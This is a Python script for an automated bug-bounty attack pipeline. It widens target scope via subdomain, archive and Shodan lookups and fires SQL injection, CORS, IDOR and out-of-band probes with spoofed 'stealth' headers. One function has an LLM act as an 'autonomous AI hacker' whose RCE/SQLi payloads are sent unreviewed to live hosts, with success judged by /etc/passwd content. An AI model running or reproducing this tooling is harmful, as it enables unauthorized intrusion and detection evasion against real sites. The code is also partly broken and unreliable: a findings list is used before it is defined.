import sys
import os
import json
import time
import argparse
import requests
import urllib3
import subprocess
import platform
import random
import re
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Config ---
MODELS = ["gemini-1.5-pro", "gemini-1.5-flash", "gemini-2.5-flash"]
TARGETS_DIR = Path("data/selected_targets")
RESULTS_DIR = Path("data/autopilot")
RESULTS_DIR.mkdir(parents=True, exist_ok=True)
REPORTS_DIR = Path('reports')
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
]

def get_stealth_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

ENV_VARS = {}
if Path(".env").exists():
    for line in Path(".env").read_text().splitlines():
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            ENV_VARS[k.strip()] = v.strip()

DISCORD_WEBHOOK_URL = ENV_VARS.get("DISCORD_WEBHOOK_URL", "")
GEMINI_API_KEY = ENV_VARS.get("GEMINI_API_KEY", "")
SHODAN_API_KEY = ENV_VARS.get("SHODAN_API_KEY", "")
NOTION_API_KEY = ENV_VARS.get("NOTION_API_KEY", "")
NOTION_DATABASE_ID = ENV_VARS.get("NOTION_DATABASE_ID", "")
INTERACTSH_URL = ENV_VARS.get("INTERACTSH_URL", "")
NEO4J_URI = ENV_VARS.get("NEO4J_URI", "bolt://neo4j:7687")
NEO4J_USER = ENV_VARS.get("NEO4J_USER", "neo4j")
NEO4J_PASSWORD = ENV_VARS.get("NEO4J_PASSWORD", "password123")

def send_discord_webhook(finding):
    if not DISCORD_WEBHOOK_URL or "your_discord_webhook" in DISCORD_WEBHOOK_URL:
        return
    if finding.get("severity") not in ["HIGH", "CRITICAL"]:
        return
    msg = f"🚨 **{finding.get('severity')} Vulnerability Found!** 🚨\n**Type**: {finding.get('type')}\n**URL**: {finding.get('url')}\n**Program**: {finding.get('program')}"
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": msg}, timeout=3)
    except: pass

def generate_ai_report(finding):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return
    if finding.get("severity") not in ["HIGH", "CRITICAL"]: return
    
    prompt = f"Write a professional HackerOne bug bounty report for a {finding.get('severity')} severity {finding.get('type')} vulnerability on {finding.get('url')}. Include Description, Impact, and a generic Proof of Concept."
    model = random.choice(MODELS)
    url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    try:
        r = requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        report_text = r.json()['candidates'][0]['content']['parts'][0]['text']
        safe_name = finding.get('type', 'vuln')
        report_path = REPORTS_DIR / f"report_{safe_name}_{int(time.time())}.md"
        report_path.write_text(report_text, encoding="utf-8")
        log(f"[+] AI generated full bug report at {report_path}")
    except Exception as e: pass

CORS_ORIGINS = ["https://evil.com"]
SQLI_PAYLOADS = ["' OR '1'='1", "'; WAITFOR DELAY '0:0:5'--"]
SQLI_PARAMS = ["id", "req", "user"]
ASP_ENDPOINTS = ["/chkrequest.asp", "/hr.asp", "/qp.asp", "/login.php"]
IDOR_ENDPOINTS = ["/rentalcars/contract", "/api/v1/user", "/profile"]
IDOR_PARAMS = ["id", "userId", "bookingId"]
TEST_IDS = ["1", "admin"]
INTERESTING_PATHS = ["/robots.txt", "/.env", "/api/v1/", "/admin", "/.git/config"]


def create_notion_ticket(finding):
    if not NOTION_API_KEY or "your_" in NOTION_API_KEY: return
    if not NOTION_DATABASE_ID or "your_" in NOTION_DATABASE_ID: return
    try:
        url = "https://api.notion.com/v1/pages"
        headers = {"Authorization": f"Bearer {NOTION_API_KEY}", "Content-Type": "application/json", "Notion-Version": "2022-06-28"}
        data = {
            "parent": { "database_id": NOTION_DATABASE_ID },
            "properties": {
                "Name": { "title": [ { "text": { "content": f"[{finding.get('severity')}] {finding.get('type')} on {finding.get('program')}" } } ] },
                "Status": { "status": { "name": "Triage" } },
                "Severity": { "select": { "name": finding.get('severity') } },
                "URL": { "url": finding.get('url') }
            }
        }
        requests.post(url, headers=headers, json=data, timeout=5)
    except: pass

def log(msg):
    print(f"[*] {msg}", flush=True)

def load_targets():
    targets = {}
    if not TARGETS_DIR.exists(): return targets
    for f in TARGETS_DIR.glob("*.json"):
        handle = f.stem
        try:
            data = json.loads(f.read_text(encoding="utf-8"))
            urls = set()
            for s in data.get("scope", {}).get("all", []):
                atype = s.get("asset_type", "").upper()
                if atype in ("APPLE_STORE_APP_ID", "GOOGLE_PLAY_APP_ID", "HARDWARE", "WINDOWS_APP", "OTHER_APK", "CIDR", "SOURCE_CODE", "EXECUTABLE"):
                    continue
                asset = s.get("asset_identifier", "")
                if asset and len(asset) > 3 and " " not in asset and not asset.isdigit() and not asset.startswith("*"):
                    clean = asset.strip().rstrip("/")
                    if not clean.startswith("http"): clean = f"https://{clean}"
                    urls.add(clean)
            targets[handle] = list(urls)[:50]
        except Exception:
            pass
    return targets

# --- Scan Modules ---

def check_blind_oob(url):
    if not INTERACTSH_URL or "your_" in INTERACTSH_URL: return None
    try:
        headers = get_stealth_headers()
        headers["X-Forwarded-For"] = f"http://{INTERACTSH_URL}"
        headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) curl/7.68.0 http://{INTERACTSH_URL}"
        test_url = f"{url}?callback=http://{INTERACTSH_URL}&url=http://{INTERACTSH_URL}"
        requests.get(test_url, headers=headers, timeout=3, verify=False)
    except: pass
    return None


def check_headless_spa(url):
    findings = []
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            def handle_request(request):
                if "api" in request.url and request.method in ["POST", "PUT", "DELETE"]:
                    findings.append({"type": "HIDDEN_API_STATE_CHANGE", "url": request.url, "severity": "MEDIUM", "detail": f"Discovered background {request.method} API call via Headless SPA render"})
            page.on("request", handle_request)
            page.goto(url, timeout=10000, wait_until="networkidle")
            browser.close()
    except Exception: pass
    return findings if findings else None


def push_to_graph(finding):
    try:
        from neo4j import GraphDatabase
        driver = GraphDatabase.driver(NEO4J_URI, auth=(NEO4J_USER, NEO4J_PASSWORD))
        program = finding.get('program', 'unknown')
        url = finding.get('url', '')
        v_type = finding.get('type', 'unknown')
        severity = finding.get('severity', 'LOW')
        domain = urlparse(url).hostname if url else "unknown"
        query = '''
        MERGE (p:Program {name: $program})
        MERGE (d:Domain {name: $domain})
        MERGE (v:Vulnerability {type: $v_type, url: $url, severity: $severity})
        MERGE (p)-[:OWNS]->(d)
        MERGE (d)-[:HAS_VULN]->(v)
        '''
        with driver.session() as session:
            session.run(query, program=program, domain=domain, v_type=v_type, url=url, severity=severity)
        driver.close()
    except Exception as e: pass


def ai_autonomous_exploit(url):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return None
    log(f"[*] Autonomous AI analyzing {url} for custom exploits...")
    prompt = f"You are an autonomous AI hacker. Analyze this URL: {url}. Provide exactly 3 highly advanced, context-specific payload strings (separated by newlines) to inject into its parameters for RCE or advanced SQLi. Do not include any explanations, just the raw payloads."
    model = random.choice(MODELS)
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    findings = []
    try:
        r = requests.post(api_url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        payloads = r.json()['candidates'][0]['content']['parts'][0]['text'].strip().split('\n')
        for p in payloads:
            p = p.strip().strip('"').strip("'")
            if not p: continue
            headers = get_stealth_headers()
            test_url = f"{url}?id={requests.utils.quote(p)}&q={requests.utils.quote(p)}"
            resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
            if "root:x:0:0" in resp.text or "syntax error" in resp.text.lower():
                findings.append({"type": "AI_AUTONOMOUS_EXPLOIT_SUCCESS", "url": test_url, "severity": "CRITICAL", "detail": f"AI Successfully exploited endpoint using custom payload: {p[:30]}..."})
    except: pass
    return findings if findings else None


def generate_nuclei_template(finding):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return
    if finding.get("type") not in ["AI_AUTONOMOUS_EXPLOIT_SUCCESS", "HIDDEN_API_STATE_CHANGE"]: return
    template_dir = Path("custom-templates")
    template_dir.mkdir(exist_ok=True)
    prompt = f"You are a security engineer writing a Nuclei YAML template.\nBased on this finding:\nType: {finding.get('type')}\nURL: {finding.get('url')}\nDetail: {finding.get('detail')}\n\nWrite a raw Nuclei YAML template. Do NOT use markdown code blocks."
    model = random.choice(MODELS)
    url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    try:
        import time
        r = requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        yaml_content = r.json()['candidates'][0]['content']['parts'][0]['text'].strip()
        if yaml_content.startswith("```yaml"): yaml_content = yaml_content[7:]
        if yaml_content.endswith("```"): yaml_content = yaml_content[:-3]
        yaml_content = yaml_content.strip()
        safe_id = f"ai_template_{int(time.time())}.yaml"
        template_path = template_dir / safe_id
        template_path.write_text(yaml_content, encoding="utf-8")
        log(f"[+] AI self-learned and generated a new custom Nuclei template at {template_path}")
    except Exception as e: pass

def check_cors(url):
    try:
        r = requests.get(url, headers={**get_stealth_headers(), "Origin": CORS_ORIGINS[0]}, timeout=3, verify=False)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        if acao == CORS_ORIGINS[0]: return {"type": "CORS_REFLECTION", "url": url, "severity": "HIGH"}
    except Exception: pass

def check_takeover(url):
    try:
        host = urlparse(url).hostname
        r = requests.get(f"https://1.1.1.1/dns-query?name={host}&type=A", headers={"Accept": "application/dns-json"}, timeout=3)
        if r.json().get("Status", 3) != 0:
            return {"type": "SUBDOMAIN_TAKEOVER", "url": url, "severity": "HIGH", "detail": "DNS NXDOMAIN"}
    except Exception: pass

def check_sensitive_single(url, b_status=None, b_len=None):
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=3, verify=False)
        if r.status_code == 200 and len(r.text) > 50:
            if b_status == 200 and b_len is not None and abs(len(r.text) - b_len) < 100:
                return None
            return {"type": "SENSITIVE_PATH", "url": url, "severity": "MEDIUM"}
    except Exception: pass

def check_sqli_single(target, payload):
    try:
        start = time.time()
        r = requests.get(target, headers=get_stealth_headers(), timeout=6, verify=False)
        el = time.time() - start
        if r.status_code == 500:
            return {"type": "SQLI_ERROR", "url": target, "severity": "HIGH"}
        elif el > 4.5 and "WAITFOR" in payload:
            return {"type": "SQLI_TIME", "url": target, "severity": "CRITICAL"}
    except Exception: pass

def check_idor_single(target, b_len):
    try:
        r = requests.get(target, headers=get_stealth_headers(), timeout=3, verify=False)
        if r.status_code == 200 and abs(len(r.text) - b_len) > 500:
            return {"type": "IDOR_CANDIDATE", "url": target, "severity": "HIGH"}
    except Exception: pass

def get_bin(name):
    ext = ".exe" if platform.system().lower() == "windows" else ""
    bin_path = Path("tools") / name / f"{name}{ext}"
    return str(bin_path) if bin_path.exists() else None

def check_nuclei(url):
    nuclei_bin = get_bin("nuclei")
    if not nuclei_bin: return None
    try:
        cmd = [nuclei_bin, "-u", url, "-t", "cves/", "-severity", "critical,high", "-jsonl", "-silent"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        findings = []
        for line in result.stdout.splitlines():
            if not line.strip(): continue
            try:
                data = json.loads(line)
                findings.append({
                    "type": f"NUCLEI_{data.get('info', {}).get('name', 'VULN')}".replace(" ", "_").upper(),
                    "url": data.get("matched-at", url),
                    "severity": data.get("info", {}).get("severity", "HIGH").upper()
                })
            except: pass
        return findings if findings else None
    except Exception: return None

def check_ffuf(url):
    ffuf_bin = get_bin("ffuf")
    wordlist = Path("wordlists/common.txt")
    if not ffuf_bin or not wordlist.exists(): return None
    try:
        # FFUF json output prints the result for each match when -silent is not used, 
        # but with -json it prints the entire array at the end.
        cmd = [ffuf_bin, "-u", f"{url}/FUZZ", "-w", str(wordlist), "-mc", "200,204,301,302,307,401,403", "-t", "10", "-json", "-silent"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        findings = []
        try:
            data = json.loads(result.stdout)
            for res in data.get("results", []):
                findings.append({
                    "type": "FFUF_DISCOVERY",
                    "url": res.get("url"),
                    "severity": "MEDIUM",
                    "detail": f"Status: {res.get('status')} | Words: {res.get('words')}"
                })
        except: pass
        return findings if findings else None
    except Exception: return None

def check_subfinder(domain):
    bin_path = get_bin("subfinder")
    if not bin_path: return []
    try:
        r = subprocess.run([bin_path, "-d", domain, "-silent"], capture_output=True, text=True, timeout=30)
        return [f"https://{x.strip()}" for x in r.stdout.splitlines() if x.strip()]
    except: return []

def check_gau(domain):
    bin_path = get_bin("gau")
    if not bin_path: return []
    try:
        r = subprocess.run([bin_path, domain], capture_output=True, text=True, timeout=30)
        return [x.strip() for x in r.stdout.splitlines() if x.strip() and x.startswith("http")]
    except: return []

SECRET_REGEXES = {
    "AWS_API_KEY": r"(AKIA[0-9A-Z]{16})",
    "STRIPE_KEY": r"(sk_live_[0-9a-zA-Z]{24})",
    "GOOGLE_MAPS_KEY": r"(AIza[0-9A-Za-z-_]{35})"
}

def check_js_secrets(url):
    findings = []
    try:
        r = requests.get(url, headers=get_stealth_headers(), timeout=5, verify=False)
        html = r.text
        scripts = re.findall(r'<script[^>]+src="([^">]+)"', html)
        for s in scripts:
            if not s.startswith("http"):
                s = urlparse(url).scheme + "://" + urlparse(url).hostname + ("/" + s if not s.startswith("/") else s)
            sr = requests.get(s, headers=get_stealth_headers(), timeout=5, verify=False)
            for name, pattern in SECRET_REGEXES.items():
                matches = re.findall(pattern, sr.text)
                for m in set(matches):
                    findings.append({
                        "type": f"EXPOSED_SECRET_{name}",
                        "url": s,
                        "severity": "CRITICAL",
                        "detail": f"Found {name}"
                    })
    except: pass
    return findings if findings else None

def check_shodan(domain):
    if not SHODAN_API_KEY or "your_" in SHODAN_API_KEY: return []
    findings = []
    try:
        r = requests.get(f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query=hostname:{domain}", timeout=10)
        data = r.json()
        for match in data.get("matches", []):
            ip = match.get("ip_str")
            port = match.get("port")
            if port in [3306, 5432, 27017, 6379, 11211]:
                findings.append({
                    "type": "EXPOSED_DATABASE_PORT",
                    "url": f"http://{ip}:{port}",
                    "severity": "CRITICAL",
                    "detail": f"Exposed Port {port} via Shodan on Origin IP {ip}"
                })
            elif port in [3389, 22, 23, 21]:
                findings.append({
                    "type": "EXPOSED_ADMIN_PORT",
                    "url": f"http://{ip}:{port}",
                    "severity": "HIGH",
                    "detail": f"Exposed Admin Port {port} via Shodan on Origin IP {ip}"
                })
    except: pass
    return findings

# --- Engine ---
def scan_target_fast(handle, urls):
    urls = list(urls)
    log(f"--- Scanning {handle} ({len(urls)} initial URLs) ---")
    if urls:
        base_domain = urlparse(urls[0]).hostname
        if base_domain:
            log(f"[*] Expanding attack surface for {base_domain}...")
            subs = check_subfinder(base_domain)
            if subs: log(f"  [+] Subfinder found {len(subs)} subdomains")
            urls = list(set(urls + subs))[:100] 
            
            gu = check_gau(base_domain)
            if gu: log(f"  [+] GAU found {len(gu)} historical URLs")
            urls = list(set(urls + gu[:50]))
            
            sho = check_shodan(base_domain)
            if sho: 
                log(f"  [+] Shodan found {len(sho)} exposed origin IPs/ports")
                findings.extend(sho)
            
    log(f"[*] Final scan scope: {len(urls)} URLs")
    findings = []
    
    tasks = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        for u in urls:
            tasks.append(executor.submit(check_cors, u))
            tasks.append(executor.submit(check_takeover, u))
        
        bases = list(set(f"{urlparse(u).scheme}://{urlparse(u).hostname}" for u in urls))[:5]
        for b in bases:
            try:
                rand_path = f"/this-does-not-exist-{random.randint(10000, 99999)}"
                b_resp = requests.get(f"{b}{rand_path}", headers=get_stealth_headers(), timeout=3, verify=False)
                b_status = b_resp.status_code
                b_len = len(b_resp.text)
            except Exception:
                b_status = None
                b_len = None

            tasks.append(executor.submit(check_nuclei, b))
            tasks.append(executor.submit(check_ffuf, b))
            tasks.append(executor.submit(check_js_secrets, b))
            tasks.append(executor.submit(check_blind_oob, b))
            tasks.append(executor.submit(check_headless_spa, b))
            tasks.append(executor.submit(ai_autonomous_exploit, b))

            for path in INTERESTING_PATHS:
                tasks.append(executor.submit(check_sensitive_single, f"{b}{path}", b_status, b_len))
                
            for ep in ASP_ENDPOINTS:
                for param in SQLI_PARAMS:
                    for payload in SQLI_PAYLOADS:
                        target = f"{b}{ep}?{param}={requests.utils.quote(payload)}"
                        tasks.append(executor.submit(check_sqli_single, target, payload))
                        
            for ep in IDOR_ENDPOINTS:
                try:
                    b_req = requests.get(f"{b}{ep}", headers=get_stealth_headers(), timeout=3, verify=False)
                    ep_len = len(b_req.text)
                    ep_status = b_req.status_code
                    if ep_status == 200 and b_status == 200 and abs(ep_len - b_len) < 100:
                        continue
                    for param in IDOR_PARAMS:
                        for tid in TEST_IDS:
                            target = f"{b}{ep}?{param}={tid}"
                            tasks.append(executor.submit(check_idor_single, target, ep_len))
                except Exception: pass
            
        for future in as_completed(tasks):
            res = future.result()
            if res:
                if isinstance(res, list):
                    for r in res:
                        r["program"] = handle
                        findings.append(r)
                else:
                    res["program"] = handle
                    findings.append(res)
                    
    log(f"Found {len(findings)} issues for {handle}")
    return findings

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", help="Specific target")
    args = parser.parse_args()

    targets = load_targets()
    if args.target:
        if args.target not in targets:
            log("Target not found")
            return
        targets = {args.target: targets[args.target]}
        
    out = RESULTS_DIR / "latest_fast_scan.json"
    previous_scan = []
    if out.exists():
        try: previous_scan = json.loads(out.read_text())
        except: pass
    previous_sigs = {f"{x.get('type')}_{x.get('url')}" for x in previous_scan}
        
    all_findings = []
    for handle, urls in targets.items():
        all_findings.extend(scan_target_fast(handle, urls))
        
    new_count = 0
    for f in all_findings:
        sig = f"{f.get('type')}_{f.get('url')}"
        if sig not in previous_sigs:
            new_count += 1
            send_discord_webhook(f)
            generate_ai_report(f)
            create_notion_ticket(f)
            push_to_graph(f)
            generate_nuclei_template(f)

            
    out.write_text(json.dumps(all_findings, indent=2))
    log(f"Finished! Found {new_count} NEW issues out of {len(all_findings)} total. Results saved to {out}")

if __name__ == "__main__":
    main()
